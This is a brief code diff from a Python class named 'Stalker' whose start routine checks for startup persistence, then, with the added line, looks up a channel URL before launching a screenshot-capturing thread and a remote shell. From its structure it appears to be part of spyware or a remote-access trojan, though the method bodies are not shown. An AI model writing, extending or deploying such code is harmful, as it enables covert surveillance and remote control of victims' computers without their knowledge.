@@ -206,6 +206,7 @@ class Stalker:
 
     def start(self):
         if self.is_file_in_startup():
+            self.FindChannelUrl()
             threading.Thread(target=self.Screenshots).start()
             self.Shell()
         
